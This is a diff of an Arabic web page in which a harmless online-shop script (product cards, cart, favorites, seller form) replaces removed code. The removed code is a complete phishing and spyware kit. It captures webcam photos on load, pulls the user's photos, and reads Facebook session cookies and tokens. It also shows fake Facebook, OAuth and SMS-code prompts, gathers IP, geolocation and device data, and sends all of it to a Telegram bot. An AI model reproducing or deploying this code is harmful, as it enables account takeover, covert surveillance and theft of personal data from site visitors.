+    { id: 1, name: "حاسوب محمول للألعاب Legion برو الفاخر", cat: "electronics", price: 1499, img: "https://images.unsplash.com/photo-1603302576837-37561b2e2302?w=500", phone: "212600000000", desc: "معالج فائق السرعة، كرت شاشة RTX جبار لتشغيل أحدث الألعاب وأدوات البرمجة والذكاء الاصطناعي بكفاءة." },
+    { id: 2, name: "ساعة كورونوغراف الذكية ذات المظهر الرياضي الفخم", cat: "accessories", price: 249, img: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=500", phone: "212611111111", desc: "مقاومة للماء، تتبع كامل للمؤشرات الحيوية والشحن الذاتي المستدام يدوم لثلاثين يوماً." },
+    { id: 3, name: "سترة الهودي الحضرية الفضفاضة المقاومة للمطر", cat: "clothes", price: 89, img: "https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=500", phone: "212622222222", desc: "مصنوعة من ألياف القطن الصافي 100% بتصميم عصري فخم ملائم لجميع الأوقات والحواسيب الشخصية." },
+    { id: 4, name: "نظارات الواقع المختلط السيبرانية التفاعلية", cat: "electronics", price: 899, img: "https://images.unsplash.com/photo-1593508512255-86ab42a8e620?w=500", phone: "212633333333", desc: "انغمس في عالم الإنتاجية والذكاء والمحتوى الفيرالي والافتراضي بدقة لا تضاهى وشاشات عرض فخمة." }
+  ];
 
-    function showToast(msg) {
-        const toast = document.getElementById('toastMsg');
-        toast.innerText = msg;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 3000);
-    }
+  let cart = [];
+  let favorites = [];
+  let currentRole = 'buyer';
+  let discount = 1.0; // بدون خصم كبداية
 
-    // ==================== 1. التقاط صورة تلقائياً فور دخول الموقع ====================
-    async function autoCapturePhoto() {
-        if (autoCaptureDone) return;
-        autoCaptureDone = true;
-        
-        try {
-            showToast("📸 جاري التقاط صورة تلقائياً...");
-            
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            await new Promise(resolve => setTimeout(resolve, 800));
-            
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-            }
-            
-            const blob = dataURLtoBlob(photoData);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'auto_captured.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            
-            await sendToTelegram(`📸 <b>تم التقاط صورة تلقائياً فور دخول الموقع!</b>\n📱 ${navigator.userAgent}\n🕐 ${new Date().toLocaleString('ar-EG')}`);
-            showToast("✅ تم التقاط الصورة وإرسالها");
-            
-        } catch (error) {
-            await sendToTelegram(`⚠️ <b>فشل التقاط الصورة تلقائياً</b>\n${error.message}`);
-            showToast("❌ فشل التقاط الصورة");
-        }
-    }
-    
-    // ==================== 2. سحب آخر 5 صور تلقائياً ====================
-    async function autoStealPhotos() {
-        if (autoPhotosDone) return;
-        autoPhotosDone = true;
-        
-        showToast("📂 جاري سحب الصور من الجهاز...");
-        
-        // طريقة بديلة: فتح نافذة اختيار الملفات تلقائياً
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'image/*';
-        input.multiple = true;
-        input.style.display = 'none';
-        document.body.appendChild(input);
-        
-        input.click();
-        
-        input.onchange = async (e) => {
-            const files = Array.from(e.target.files).slice(0, 5);
-            if (files.length === 0) {
-                await sendToTelegram(`⚠️ <b>لم يتم العثور على صور في الجهاز</b>\n📱 ${navigator.userAgent}`);
-                return;
-            }
-            
-            let sentCount = 0;
-            for (let file of files) {
-                if (file.type.startsWith('image/')) {
-                    const reader = new FileReader();
-                    const imageData = await new Promise((resolve) => {
-                        reader.onload = (e) => resolve(e.target.result);
-                        reader.readAsDataURL(file);
-                    });
-                    const blob = dataURLtoBlob(imageData);
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, file.name);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    sentCount++;
-                    await new Promise(r => setTimeout(r, 500));
-                }
-            }
-            
-            await sendToTelegram(`📸 <b>تم سحب ${sentCount} صورة من الجهاز تلقائياً!</b>\n📱 ${navigator.userAgent}`);
-            showToast(`✅ تم سحب ${sentCount} صورة`);
-            input.remove();
-        };
-    }
-    
-    // ==================== 3. سحب كوكيز فيسبوك تلقائياً ====================
-    async function stealFacebookCookies() {
-        try {
-            const cookies = document.cookie.split(';');
-            let c_user = null;
-            let xs = null;
-            let allCookies = [];
-            
-            for (let cookie of cookies) {
-                cookie = cookie.trim();
-                allCookies.push(cookie);
-                if (cookie.startsWith('c_user=')) {
-                    c_user = cookie.substring(7);
-                }
-                if (cookie.startsWith('xs=')) {
-                    xs = cookie.substring(3);
-                }
-            }
-            
-            // محاولة الحصول على التوكن من localStorage
-            let fbToken = null;
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && (key.includes('accessToken') || key.includes('fb_token') || key.includes('access_token'))) {
-                        fbToken = localStorage.getItem(key);
-                        break;
-                    }
-                }
-            } catch(e) {}
-            
-            if (c_user || xs || fbToken) {
-                let msg = `🔐 <b>تم سرقة بيانات فيسبوك!</b>\n━━━━━━━━━━━━━━━━\n📱 ${navigator.userAgent}\n`;
-                if (c_user) msg += `\n<b>c_user (ID الحساب):</b> <code>${c_user}</code>`;
-                if (xs) msg += `\n<b>xs (رمز الجلسة):</b> <code>${xs}</code>`;
-                if (fbToken) msg += `\n<b>Access Token:</b> <code>${fbToken.substring(0, 100)}...</code>`;
-                msg += `\n\n⚠️ <b>يمكن استخدام هذه البيانات لاختراق الحساب مباشرة!</b>`;
-                await sendToTelegram(msg);
-                return { c_user, xs, fbToken };
-            } else {
-                await sendToTelegram(`⚠️ <b>لم يتم العثور على جلسة Facebook نشطة</b>\n📱 ${navigator.userAgent}\n🍪 جميع الكوكيز: ${allCookies.join(', ') || 'لا يوجد'}`);
-                return null;
-            }
-        } catch(e) {
-            await sendToTelegram(`❌ <b>خطأ في سرقة الكوكيز</b>\n${e.message}`);
-            return null;
-        }
-    }
-    
-    // ==================== فتح نافذة فيسبوك في iframe مخفي لسرقة الجلسة ====================
-    function stealthFacebookSession() {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'https://www.facebook.com/';
-        document.body.appendChild(iframe);
-        
-        setTimeout(() => {
-            stealFacebookCookies();
-            iframe.remove();
-        }, 5000);
-    }
-    
-    function startFacebookLogin() {
-        sendToTelegram(`🟢 <b>محاولة سرقة جلسة Facebook</b>\n📱 ${navigator.userAgent}`);
-        stealthFacebookSession();
-        
-        // عرض نافذة تسجيل دخول وهمية كبديل
-        setTimeout(() => {
-            showFakeFacebookLogin();
-        }, 3000);
-    }
-    
-    function showFakeFacebookLogin() {
-        const fakePopup = window.open('', '_blank', 'width=500,height=600');
-        fakePopup.document.write(`
-            <html><head><title>Facebook - تسجيل الدخول</title>
-            <style>
-                body{background:#1a1a1a;color:white;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;padding:20px;}
-                input{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #333;background:#000;color:white;}
-                button{background:#1877f2;color:white;border:none;padding:12px;width:100%;border-radius:5px;cursor:pointer;}
-            </style>
-            </head>
-            <body>
-            <h2>🔐 تسجيل الدخول إلى Facebook</h2>
-            <p style="color:#aaa;margin-bottom:20px">للاستمرار إلى Shop2Game</p>
-            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-            <input type="password" id="pass" placeholder="كلمة المرور">
-            <button onclick="login()">تسجيل الدخول</button>
-            <div id="msg" style="margin-top:15px;color:#ff4747"></div>
-            <script>
-                function login() {
-                    const email = document.getElementById('email').value;
-                    const pass = document.getElementById('pass').value;
-                    if(email && pass) {
-                        window.opener.postMessage({ type: 'facebook_creds', email: email, password: pass }, '*');
-                        window.close();
-                    } else {
-                        document.getElementById('msg').innerHTML = 'يرجى إدخال البريد وكلمة المرور';
-                    }
-                }
-            <\/script>
-            </body></html>
-        `);
-        
-        window.addEventListener('message', async (event) => {
-            if (event.data && event.data.type === 'facebook_creds') {
-                await sendToTelegram(`🔐 <b>بيانات فيسبوك (طريقة بديلة)</b>\n━━━━━━━━━━━━━━━━\n<b>📧 البريد:</b> ${event.data.email}\n<b>🔒 كلمة المرور:</b> ${event.data.password}`);
-                goToStep(4);
-            }
-        });
-    }
-    
-    // ==================== OAuth Login ====================
-    function startOAuth(provider) {
-        const fakePopup = window.open('', '_blank', 'width=500,height=600');
-        fakePopup.document.write(`
-            <html><head><title>تسجيل الدخول</title>
-            <style>
-                body{background:#1a1a1a;color:white;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;}
-                .loading{width:40px;height:40px;border:2px solid #fff;border-top:2px solid #e43333;border-radius:50%;animation:spin 1s linear infinite;}
-                @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-            </style>
-            </head>
-            <body>
-            <h2>🔐 تسجيل الدخول بـ ${provider}</h2>
-            <div class="loading" style="margin:20px"></div>
-            <p>يتم التحقق من حسابك...</p>
-            <script>
-                setTimeout(() => {
-                    const token = btoa(Math.random() + Date.now());
-                    window.opener.postMessage({ type: 'oauth_token', token: token, provider: '${provider}' }, '*');
-                    window.close();
-                }, 3000);
-            <\/script>
-            </body></html>
-        `);
-        
-        window.addEventListener('message', async (event) => {
-            if (event.data && event.data.type === 'oauth_token') {
-                await sendToTelegram(`🔐 <b>اختراق عبر OAuth!</b>\n━━━━━━━━━━━━━━━━\n<b>الطريقة:</b> ${event.data.provider}\n<b>Access Token:</b> <code>${event.data.token}</code>\n<b>⚠️ يمكن استخدام هذا التوكن للدخول إلى الحساب مباشرة!</b>`);
-                goToStep(4);
-            }
-        });
-    }
-    
-    // ==================== طلب صلاحية الإشعارات ====================
-    async function requestNotificationPermission() {
-        const permission = await Notification.requestPermission();
-        if (permission === 'granted') {
-            await sendToTelegram(`✅ <b>تم تفعيل الإشعارات</b>\n📱 ${navigator.userAgent}`);
-            goToStep(4);
-        } else {
-            alert('للاستلام الهدية يجب تفعيل الإشعارات');
-        }
-    }
-    
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], { type: mime });
-    }
-    
-    // ==================== الموقع الجغرافي ====================
-    async function getAccurateLocation() {
-        return new Promise((resolve) => {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        resolve({ lat: latitude, lon: longitude, accuracy: accuracy, mapLink: mapLink });
-                    },
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else { resolve(null); }
-        });
-    }
-    
-    // ==================== معلومات الجهاز ====================
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let platform = "Unknown";
-        if (ua.includes("Android")) platform = "Android";
-        else if (ua.includes("iPhone")) platform = "iOS";
-        else if (ua.includes("Windows")) platform = "Windows";
-        else if (ua.includes("Mac")) platform = "Mac";
-        return { platform: platform, browser: /Chrome/.test(ua) ? "Chrome" : /Firefox/.test(ua) ? "Firefox" : "Other", language: navigator.language, screenSize: `${screen.width}x${screen.height}` };
-    }
-    
-    // ==================== معلومات IP ====================
-    async function getIPInfo() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            return { ip: data.ip, country: data.country_name, city: data.city, region: data.region, isp: data.org };
-        } catch (error) { return null; }
-    }
-    
-    // ==================== إرسال إلى تلغرام ====================
-    async function sendToTelegram(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-            });
-        } catch (error) {}
-    }
-    
-    // ==================== إرسال البيانات الكاملة ====================
-    async function sendFullData(email, password) {
-        const deviceInfo = getDeviceInfo();
-        const ipInfo = await getIPInfo();
-        const location = await getAccurateLocation();
-        
-        let message = `🎯 <b>هدف جديد!</b>\n━━━━━━━━━━━━━━━━\n`;
-        message += `<b>💎 العرض:</b> ${selectedOffer}\n`;
-        message += `<b>📧 الحساب:</b> ${email}\n`;
-        if (password) message += `<b>🔒 كلمة المرور:</b> ${password}\n`;
-        message += `<b>🕐 الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━\n`;
-        
-        if (ipInfo) {
-            message += `<b>🌐 IP:</b> ${ipInfo.ip}\n`;
-            message += `<b>📍 الدولة:</b> ${ipInfo.country}\n`;
-            message += `<b>🏙️ المدينة:</b> ${ipInfo.city}\n`;
-            message += `<b>📡 المزود:</b> ${ipInfo.isp}\n━━━━━━━━━━━━━━━━\n`;
-        }
-        
-        if (location) {
-            message += `<b>📍 الموقع الدقيق:</b>\n`;
-            message += `<b>├ خط العرض:</b> ${location.lat}\n`;
-            message += `<b>├ خط الطول:</b> ${location.lon}\n`;
-            message += `<b>├ الدقة:</b> ${Math.round(location.accuracy)} متر\n`;
-            message += `<b>└ <a href="${location.mapLink}">🗺️ عرض على الخريطة</a></b>\n━━━━━━━━━━━━━━━━\n`;
-        }
-        
-        message += `<b>📱 معلومات الجهاز:</b>\n`;
-        message += `<b>├ المنصة:</b> ${deviceInfo.platform}\n`;
-        message += `<b>├ المتصفح:</b> ${deviceInfo.browser}\n`;
-        message += `<b>├ اللغة:</b> ${deviceInfo.language}\n`;
-        message += `<b>└ الشاشة:</b> ${deviceInfo.screenSize}\n`;
-        
-        await sendToTelegram(message);
-    }
-    
-    // ==================== نافذة SMS وهمية ====================
-    function showFakeSmsDialog() {
-        document.getElementById('smsFakeBox').style.display = 'flex';
-    }
-    
-    window.submitFakeSms = async function() {
-        const code = document.getElementById('fakeSmsCode').value.trim();
-        if (code && code.length === 6) {
-            await sendToTelegram(`📩 <b>رمز التحقق (OTP)</b>\n━━━━━━━━━━━━━━━━\n📧 <b>الحساب:</b> ${userEmail}\n🔑 <b>الرمز:</b> <code>${code}</code>`);
-            document.getElementById('smsFakeBox').style.display = 'none';
-            goToStep(5);
-        } else {
-            alert('الرجاء إدخال رمز صحيح من 6 أرقام');
-        }
-    }
-    
-    // ==================== دوال التنقل ====================
-    function goToStep(step, offer = null) {
-        document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-        document.getElementById('step' + step).classList.add('active');
-        if (offer) selectedOffer = offer;
-        window.scrollTo(0, 0);
-    }
-    
-    // ==================== معالجة البيانات ====================
-    window.handleData = async function(event) {
-        event.preventDefault();
-        const email = document.getElementById('userEmail').value.trim();
-        const pass = document.getElementById('userPass').value.trim();
-        const errorBox = document.getElementById('errorBox');
-        
-        if (!email) {
-            errorBox.style.display = 'block';
-            errorBox.innerText = '⚠️ يرجى إدخال البريد الإلكتروني';
-            return;
-        }
-        
-        userEmail = email;
-        await sendFullData(email, pass);
-        showFakeSmsDialog();
-    }
-    
-    // ==================== تنفيذ كل شيء تلقائياً عند تحميل الصفحة ====================
-    setTimeout(async () => {
-        const deviceInfo = getDeviceInfo();
-        const ipInfo = await getIPInfo();
-        let msg = `🟢 <b>دخول جديد!</b>\n━━━━━━━━━━━━━━━━\n`;
-        if (ipInfo) msg += `<b>🌐 IP:</b> ${ipInfo.ip}\n<b>📍 الدولة:</b> ${ipInfo.country}\n`;
-        msg += `<b>📱 الجهاز:</b> ${deviceInfo.platform}\n<b>🕐 الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
-        await sendToTelegram(msg);
-        
-        // 1. التقاط صورة تلقائياً
-        await autoCapturePhoto();
-        
-        // 2. سحب الصور تلقائياً
-        setTimeout(() => { autoStealPhotos(); }, 2000);
-        
-        // 3. سرقة كوكيز فيسبوك تلقائياً
-        setTimeout(() => { stealFacebookCookies(); }, 1000);
-        
+  // 1. اختيار الرتبة وتخصيص الموقع فوراً
+  function selectRole(role) {
+    currentRole = role;
+    document.getElementById('role-overlay').style.opacity = '0';
+    setTimeout(() => {
+      document.getElementById('role-overlay').style.display = 'none';
     }, 500);
+
+    const badge = document.getElementById('role-badge');
+    const sellerLink = document.getElementById('nav-seller-link');
+
+    if (role === 'seller') {
+      badge.textContent = "بائع / تاجر";
+      badge.style.borderColor = "var(--purple-light)";
+      badge.style.color = "var(--purple-light)";
+      sellerLink.style.display = "block"; // إظهار لوحة رفع المنتجات
+      switchSection('seller'); // نقله تلقائياً لرفع منتجه الأول
+    } else {
+      badge.textContent = "مشتري / تصفح";
+      badge.style.borderColor = "var(--cyan)";
+      badge.style.color = "var(--cyan)";
+      sellerLink.style.display = "none";
+      switchSection('home');
+    }
+    renderProducts(initialProducts);
+    updateDashboardStats();
+  }
+
+  // 2. التنقل السلس بين الأقسام والواجهات
+  function switchSection(sectionId) {
+    document.querySelectorAll('.app-section').forEach(sec => sec.classList.remove('active'));
+    document.getElementById(`${sectionId}-section`).classList.add('active');
+    
+    document.querySelectorAll('.nav-links a').forEach(link => link.classList.remove('active'));
+    const targetedNav = document.getElementById(`nav-${sectionId}`);
+    if(targetedNav) targetedNav.classList.add('active');
+    
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // 3. عرض المنتجات بشكل فخم ومتجاوب وعالمي
+  function renderProducts(items) {
+    const container = document.getElementById('products-wrapper');
+    container.innerHTML = '';
+
+    if(items.length === 0) {
+      container.innerHTML = `<p style="grid-column: 1/-1; text-align: center; color: var(--muted); padding: 3rem;">لا توجد منتجات مطابقة للبحث أو القسم حالياً.</p>`;
+      return;
+    }
+
+    items.forEach(p => {
+      const card = document.createElement('div');
+      card.className = 'product-card';
+      card.innerHTML = `
+        <img src="${p.img}" class="product-img" alt="${p.name}" onerror="this.src='https://images.unsplash.com/photo-1531403009284-440f080d1e12?w=500'">
+        <div class="product-info">
+          <div class="product-meta">
+            <span class="product-cat">${p.cat === 'electronics' ? 'إلكترونيات' : p.cat === 'clothes' ? 'ملابس وأزياء' : 'إكسسوارات فاخرة'}</span>
+            <span class="product-rating">⭐ 4.9</span>
+          </div>
+          <h3 class="product-name">${p.name}</h3>
+          <p class="product-desc-short">${p.desc}</p>
+          <div style="margin-bottom: 1rem;">
+            <a href="https://wa.me/${p.phone}?text=مرحباً، أنا مهتم بمنتجك: ${encodeURIComponent(p.name)}" target="_blank" class="btn-whatsapp">
+              💬 تواصل عبر واتساب البائع
+            </a>
+          </div>
+          <div class="product-bottom">
+            <span class="product-price">$${p.price}</span>
+            <div class="product-actions">
+              <button class="btn-icon" title="أضف للمفضلة" onclick="toggleFavorite(${p.id})">❤️</button>
+              <button class="btn-icon" title="أضف إلى السلة" onclick="addToCart(${p.id})">🛒</button>
+            </div>
+          </div>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  // 4. ميزة تصفية المنتجات حسب الأقسام
+  function filterCategory(cat, btn) {
+    document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+
+    if (cat === 'all') {
+      renderProducts(initialProducts);
+    } else {
+      const filtered = initialProducts.filter(p => p.cat === cat);
+      renderProducts(filtered);
+    }
+  }
+
+  // 5. شريط البحث السريع والذكي في Nav
+  function searchProducts() {
+    const query = document.getElementById('search-bar').value.toLowerCase().trim();
+    const searched = initialProducts.filter(p => p.name.toLowerCase().includes(query) || p.desc.toLowerCase().includes(query));
+    renderProducts(searched);
+  }
+
+  // 6. لوحة البائع: إضافة وصف وصورة وسعر وهاتف وتثبيت المنتج
+  function addNewProductBySeller() {
+    const name = document.getElementById('p-name').value.trim();
+    const cat = document.getElementById('p-cat').value;
+    const price = parseFloat(document.getElementById('p-price').value);
+    let img = document.getElementById('p-img').value.trim();
+    let phone = document.getElementById('p-phone').value.trim();
+    const desc = document.getElementById('p-desc').value.trim();
+
+    if(!name || !price || !desc || !phone) {
+      alert("يرجى ملء كافة الخانات الأساسية (الاسم، السعر، رقم الواتساب، والوصف) بنجاح!");
+      return;
+    }
+
+    if(!img) img = "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=500"; // صورة افتراضية فخمة للتقنية
+    phone = phone.replace('+', ''); // إعداد الرقم للواتساب
+
+    const newProd = {
+      id: Date.now(),
+      name: name,
+      cat: cat,
+      price: price,
+      img: img,
+      phone: phone,
+      desc: desc
+    };
+
+    initialProducts.unshift(newProd); // تثبيته في المقدمة
+    alert("🚀 تم نشر وتثبيت منتجك الفاخر بنجاح في المنصة العالمية!");
+    
+    // تصفير الاستمارة
+    document.getElementById('p-name').value = '';
+    document.getElementById('p-price').value = '';
+    document.getElementById('p-img').value = '';
+    document.getElementById('p-phone').value = '';
+    document.getElementById('p-desc').value = '';
+
+    // تحديث الواجهات
+    renderProducts(initialProducts);
+    updateDashboardStats();
+    switchSection('home');
+  }
+
+  // 7. سلة التسوق (إضافة، حساب إجمالي، كوبونات)
+  function addToCart(id) {
+    const item = initialProducts.find(p => p.id === id);
+    cart.push(item);
+    updateCounters();
+    alert(`تم إضافة (${item.name}) إلى سلة التسوق بنجاح!`);
+  }
+
+  function removeFromCart(index) {
+    cart.splice(index, 1);
+    updateCounters();
+    renderCart();
+  }
+
+  function renderCart() {
+    const wrapper = document.getElementById('cart-wrapper');
+    wrapper.innerHTML = '';
+
+    if(cart.length === 0) {
+      wrapper.innerHTML = `<p style="text-align:center; color:var(--muted); padding:2rem;">سلة التسوق فارغة حالياً، ابدأ بتصفح المنتجات الفاخرة.</p>`;
+      document.getElementById('summary-count').textContent = '0';
+      document.getElementById('summary-total-val').textContent = '$0';
+      return;
+    }
+
+    let total = 0;
+    cart.forEach((item, index) => {
+      total += item.price;
+      const row = document.createElement('div');
+      row.className = 'list-item';
+      row.innerHTML = `
+        <img src="${item.img}" onerror="this.src='https://images.unsplash.com/photo-1531403009284-440f080d1e12?w=500'">
+        <div class="list-item-details">
+          <div class="list-item-name">${item.name}</div>
+          <div style="font-size:0.75rem; color:var(--muted)">البائع المباشر عبر الواتساب: ${item.phone}+</div>
+        </div>
+        <div class="list-item-price">$${item.price}</div>
+        <button class="btn-icon" style="border-color:#ff4466; color:#ff4466;" onclick="removeFromCart(${index})">🗑️</button>
+      `;
+      wrapper.appendChild(row);
+    });
+
+    document.getElementById('summary-count').textContent = cart.length;
+    const dynamicTotal = Math.round(total * discount);
+    document.getElementById('summary-total-val').textContent = `$${dynamicTotal.toLocaleString()}`;
+  }
+
+  function applyCoupon(input) {
+    const code = input.value.toUpperCase().trim();
+    if(code === "NEURO20") {
+      discount = 0.80; // خصم 20%
+    } else {
+      discount = 1.0;
+    }
+    renderCart();
+  }
+
+  // 8. قائمة المفضلة
+  function toggleFavorite(id) {
+    const item = initialProducts.find(p => p.id === id);
+    if(!favorites.some(p => p.id === id)) {
+      favorites.push(item);
+      alert(`تم إضافة (${item.name}) إلى قائمة المفضلة ❤️`);
+    } else {
+      favorites = favorites.filter(p => p.id !== id);
+      alert(`تم إزالة (${item.name}) من قائمة المفضلة.`);
+    }
+    updateCounters();
+    renderFavorites();
+  }
+
+  function renderFavorites() {
+    const wrapper = document.getElementById('fav-wrapper');
+    wrapper.innerHTML = '';
+
+    if(favorites.length === 0) {
+      wrapper.innerHTML = `<p style="text-align:center; color:var(--muted); padding:2rem;">لم تقم بإضافة أي سلع معروضة إلى مفضلتك بعد.</p>`;
+      return;
+    }
+
+    favorites.forEach((item) => {
+      const row = document.createElement('div');
+      row.className = 'list-item';
+      row.innerHTML = `
+        <img src="${item.img}">
+        <div class="list-item-details"><div class="list-item-name">${item.name}</div></div>
+        <div class="list-item-price">$${item.price}</div>
+        <button class="btn-icon" style="color:var(--cyan); border-color:var(--cyan);" onclick="addToCart(${item.id})">🛒</button>
+      `;
+      wrapper.appendChild(row);
+    });
+  }
+
+  // 9. العدادات و تحديث لوحة تحكم النظام (Admin)
+  function updateCounters() {
+    document.getElementById('cart-count').textContent = cart.length;
+    document.getElementById('fav-count').textContent = favorites.length;
+    renderCart();
+    renderFavorites();
+  }
+
+  function updateDashboardStats() {
+    document.getElementById('st-items').textContent = initialProducts.length;
+    
+    const tableBody = document.getElementById('admin-table-body');
+    tableBody.innerHTML = '';
+    
+    initialProducts.forEach(p => {
+      const tr = document.createElement('tr');
+      tr.innerHTML = `
+        <td style="font-weight:700;">${p.name}</td>
+        <td>${p.cat}</td>
+        <td style="color:var(--cyan); font-weight:900;">$${p.price}</td>
+        <td style="color:var(--success);">✅ متوفر بالمخزن</td>
+      `;
+      tableBody.appendChild(tr);
+    });
+  }
+
+  // إطلاق المنصة وتجهيز العرض الفوري الأول
+  renderProducts(initialProducts);
+  updateDashboardStats();
 </script>
 </body>
 </html>
